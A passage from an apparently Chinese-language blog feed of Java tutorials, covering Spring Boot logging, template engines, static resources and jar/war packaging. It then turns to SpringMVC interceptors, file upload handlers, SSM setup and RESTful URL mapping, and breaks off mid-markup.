class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动类演示使用日志</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(Starter.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;SpringBoot LogInfoTest&quot;</span>);</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改日志输出格式，将其添加进<code>application.yml</code>中</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">pattern:</span></span><br><span class="line">    <span class="attr">console:</span> <span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%thread] %-5level %logger - %msg%n&quot;</span></span><br><span class="line">  <span class="attr">level:</span> <span class="string">debug</span></span><br><span class="line">  <span class="attr">file:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;springboot.log&quot;</span></span><br></pre></td></tr></table></figure><br/><h2 id="视图集成"><a href="#视图集成" class="headerlink" title="视图集成"></a>视图集成</h2><h3 id="FreeMark模板引擎"><a href="#FreeMark模板引擎" class="headerlink" title="FreeMark模板引擎"></a>FreeMark模板引擎</h3><p>引入依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Freemarker 默认视图路径为 <code>resources/templates</code> 目录(由自动化配置类 <code>FreemarkerProperties</code> 决定)，该目录可以在<code>application.yml</code>中进行修改</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">freemarker:</span></span><br><span class="line">    <span class="attr">suffix:</span> <span class="string">.ftl</span></span><br><span class="line">    <span class="attr">content-type:</span> <span class="string">text/html</span></span><br><span class="line">    <span class="attr">charset:</span> <span class="string">UTF-8</span></span><br><span class="line">    <span class="attr">template-loader-path:</span> <span class="string">classpath:/views/</span></span><br></pre></td></tr></table></figure><p>FreeMark的的模板文件后缀是<code>.ftl</code></p><h3 id="Thymeleaf渲染引擎"><a href="#Thymeleaf渲染引擎" class="headerlink" title="Thymeleaf渲染引擎"></a>Thymeleaf渲染引擎</h3><p>SpringBoot 支持多种视图技术集成，并且 SpringBoot 官网推荐使用 Thymeleaf 作为前端视图页面，这里实现 Thymeleaf 视图集成，借助入门项目引入 Thymeleaf 环境配置</p><p>引入依赖项</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Thymeleaf 默认视图路径为 <code>resources/templates</code> 目录(由自动化配置类 <code>ThymeleafProperties</code> 决定)，该目录可以在<code>application.yml</code>中进行修改</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">thymeleaf:</span></span><br><span class="line">    <span class="attr">prefix:</span> <span class="string">classpath:/html/</span></span><br><span class="line">    <span class="comment"># 关闭 thymeleaf 页面缓存</span></span><br><span class="line">    <span class="attr">cache:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>Thymeleaf可以直接对html进行渲染，使用其特定的语法即可识别进行渲染</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><br/><h2 id="静态资源访问"><a href="#静态资源访问" class="headerlink" title="静态资源访问"></a>静态资源访问</h2><p>在 <code>resources</code> 目录下创建 <code>static</code> 或者 <code>public</code> 目录，存放<code>images</code>、<code>js</code>、<code>css</code> 等静态资源文件，默认的路径有<code>resources/public</code>、<code>resources/static</code>、<code>resources/</code></p><p>若要自定义静态资源路径，可以在<code>application.yml</code>中添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">    <span class="attr">static-locations:</span> <span class="string">classpath:/public/,classpath:/static/,classpath:/path/to/your/static</span></span><br></pre></td></tr></table></figure><br/><h2 id="应用打包"><a href="#应用打包" class="headerlink" title="应用打包"></a>应用打包</h2><h3 id="Jar包部署"><a href="#Jar包部署" class="headerlink" title="Jar包部署"></a>Jar包部署</h3><p>在 IDEA 下配置 <code>clean compile package -Dmaven.test.skip=true</code> 执行打包命令，target 目录得到待部署的项目文件</p><p>打包完成后，使用命令行即可编译jar包运行web程序</p><h3 id="War包部署"><a href="#War包部署" class="headerlink" title="War包部署"></a>War包部署</h3><p>修改<code>pom.xml</code>的<code>&lt;packaging&gt;</code>标签改为<code>war</code>，默认为<code>jar</code></p><p>忽略内嵌Tomcat，使用<code>provided</code>属性忽略</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置生成的war包属性</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置生成的 war 文件名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>springboot<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动类继承<code>SpringBootServletInitializer</code>并重写<code>configure()</code>方法，指定外部tomcat读取项目入口方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Starter</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(Starter.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;SpringBoot LogInfoTest&quot;</span>);</span><br><span class="line">        SpringApplication.run(Starter.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(Starter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行maven打包命令，生成war包</p><br/>]]></content>
      
      
      <categories>
          
          <category> 简易开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC第二部分</title>
      <link href="/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/"/>
      <url>/2025/12/30/SpringMVC%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringMVC第二部分"><a href="#SpringMVC第二部分" class="headerlink" title="SpringMVC第二部分"></a>SpringMVC第二部分</h1><br/><h2 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h2><p>SpringMVC 中的 Interceptor 拦截器也是相当重要和相当有用的，它的主要作用是拦截用户的请求并进行相应的处理。比如通过它来进行权限验证，或者是来判断用户是否登陆等操作</p><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p><strong>实现<code>HandlerInterceptor</code>接口</strong></p><p>实现接口类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, <span class="meta">@Nullable</span> Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>preHandle()</code>方法表示在目标拦截方法执行前进行的操作，其返回值若为<code>true</code>则会继续执行目标方法，反之则不执行。<code>postHandle()</code>表示在方法执行后返回视图前进行的操作，<code>afterCompletion()</code>表示在目标Handler执行完毕后进行的操作</p><p><strong>继承<code>HandlerInterceptorAdapter</code>抽象类</strong></p><p>该类接入了<code>AsyncHandlerInterceptor</code>接口，而该接口接入了<code>HandlerInterceptor</code>接口，故本质与上个方法没有区别，而且该类目前已被弃用，不再过多赘述</p><h4 id="配置拦截器"><a href="#配置拦截器" class="headerlink" title="配置拦截器"></a>配置拦截器</h4><p>通过配置XML配置文件来进行拦截器的配置，有两种方法，方法一</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    使用bean定义一个Interceptor</span></span><br><span class="line"><span class="comment">    直接定义在mvc:interceptors根下面的Interceptor将拦截所有的请求--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 通过 mvc:mapping 配置需要拦截的资源。支持通配符。可配置多个 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &quot;/**&quot;表示拦截所有的请求。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 通过 mvc:exclude-mapping 配置不需要被拦截的资源。支持通配符。可配置多个 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:exclude-mapping</span> <span class="attr">path</span>=<span class="string">&quot;/test/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置多个拦截器</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;path.to.your.interceptor2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>多个拦截器的执行顺序是先配置的拦截器的<code>preHandle()</code>方法先执行，<code>postHandle()</code>、<code>afterCompletion()</code>方法后执行</p><br/><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>添加<code>commons-fileupload</code>依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改<code>servlet-context.xml</code>设置相关配置，数字的单位是字节</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;multipartResolver&quot;</span></span><br><span class="line">    class=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span><br><span class="line">    &lt;!-- 允许文件上传的最大尺寸 --&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;maxUploadSize&quot;</span>&gt;</span><br><span class="line">        &lt;value&gt;<span class="number">104857600</span>&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    设置文件放入临时文件夹的最大限制</span><br><span class="line">    此值是阈值，低于此值，则保存在内存中，如高于此值，则生成硬盘上的临时文件</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;property name=<span class="string">&quot;maxInMemorySize&quot;</span>&gt;</span><br><span class="line">        &lt;value&gt;<span class="number">4096</span>&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure><h3 id="单文件上传"><a href="#单文件上传" class="headerlink" title="单文件上传"></a>单文件上传</h3><p><strong>前端表单</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>type</code>属性值代表传递文件，<code>enctype</code>属性值代表以二进制形式传输数据，<code>action</code>属性值表示后端处理的路径</p><p><strong>后端处理逻辑</strong></p><p> 后端通过<code>MultipartFile</code>获得文件，之后需设置文件上传路径，返回页面渲染</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/uploadFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="type">File</span> <span class="variable">uploadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!uploadFile.exists()) &#123;</span><br><span class="line">                uploadFile.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="type">String</span> <span class="variable">originalName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> System.currentTimeMillis() + suffix;</span><br><span class="line">            file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(path + <span class="string">&quot;/upload/&quot;</span> + fileName));</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;文件上传成功！&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;文件上传失败！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;文件不存在！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;result&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处的后端逻辑还修改的上传后的文件名为系统毫秒时</p><h3 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h3><p><strong>前端表单</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;uploadFile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>后端处理逻辑</strong></p><p>后端获取文件集合遍历，再依次执行前面的处理逻辑即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/uploadFiles&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">uploadFiles</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestParam(&quot;files&quot;)</span> List&lt;MultipartFile&gt; files)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (MultipartFile file : files) &#123;</span><br><span class="line">            saveFile(request, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;result&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="SSM框架集成"><a href="#SSM框架集成" class="headerlink" title="SSM框架集成"></a>SSM框架集成</h2><p>SSM框架是Spring + Spring MVC + MyBatis三个开源框架的整合，是Java企业级开发中非常流行的轻量级框架组合，主要用于构建Web应用程序</p><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p><strong>配置pom.xml</strong></p><p>依赖项配置<code>pom.xml</code>，此处包括<code>junit</code>、<code>spring-context</code>、<code>spring-test</code>、<code>spring-jdbc</code>、<code>spring-tx</code>、<code>aspectjweaver</code>、<code>c3p0</code>、<code>mybatis</code>、<code>mybatis-spring</code>、<code>mysql-connector-java</code>、<code>slf4j-log4j</code>、<code>pagehelpler</code>、<code>spring-web</code>、<code>spring-webmvc</code>、<code>javax.servlet-api</code>、<code>jackson-core</code>、<code>commons-fileupload</code>等，版本还需要自己斟酌</p><p>Maven 项目中，如果源代码（src&#x2F;main&#x2F;java）存在 xml、properties、tld 等文件，Maven 默认不会自动编译该文件到输出目录，如果要编译源代码中 xml、properties、tld 等文件，需要显式配置 resources 标签</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.tld<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，后面还有<strong>配置web.xml</strong>、<strong>配置servlet-content.xml</strong>、<strong>配置spring.xml</strong>、<strong>配置mybatis.xml</strong>、<strong>配置db.properties</strong>、<strong>配置log4j.properties</strong></p><p>可以发现，原生spring框架下配置工作非常繁琐，这促成了SpringBoot的产生，其约定大于配置的特性极大地减少了机械性的配置操作，不久我们将接触这一领先技术</p> <br/><h2 id="RestFul-URL"><a href="#RestFul-URL" class="headerlink" title="RestFul URL"></a>RestFul URL</h2><p>RestFul 风格的 API 是一种软件架构风格，设计风格而不是标准，只是提供了一组设计原则和约束条件。它主要用于客户端和服务器交互类的软件。基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存等机制</p><p>在 RESTful 风格中，用户请求的 url 使用同一个 url，用请求方式：<code>get</code>、<code>post</code>、<code>delete</code>、<code>put</code>等方式对请求的处理方法进行区分，这样可以在前后台分离式的开发中使用前端开发人员不会对请求的资源地址产生混淆和大量的检查方法名的麻烦，形成一个统一的接口</p><table><thead><tr><th align="left">请求方法</th><th align="left">对应 SQL 操作</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>GET</strong></td><td align="left">SELECT</td><td align="left">从服务器查询，可以通过请求的参数区分查询方式</td></tr><tr><td align="left"><strong>POST</strong></td><td align="left">CREATE（INSERT）</td><td align="left">在服务器端新建一个资源，执行插入操作</td></tr><tr><td align="left"><strong>PUT</strong></td><td align="left">UPDATE</td><td align="left">在服务器端更新资源（通常需要提供完整资源），执行更新操作</td></tr><tr><td align="left"><strong>PATCH</strong></td><td align="left">UPDATE</td><td align="left">在服务器端更新资源（客户端仅提供需要改变的属性）</td></tr><tr><td align="left"><strong>DELETE</strong></td><td align="left">DELETE</td><td align="left">从服务器端删除资源，执行删除操作</td></tr></tbody></table><p>核心是将传统的传参变为路径传参，比如<code>?id=1</code>可改写为<code>/1?</code>，SpringMVC 是通过 <code>@RequestMapping</code>及<code>@PathVariable</code>注解提供的。<code>@PathVariable</code>一般标记在形参前</p><h3 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/account/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccount</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.select(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以多参</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/account/&#123;id&#125;/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Account <span class="title function_">queryAccount</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, <span class="meta">@PathVariable</span> String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> accountService.select(id,name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span 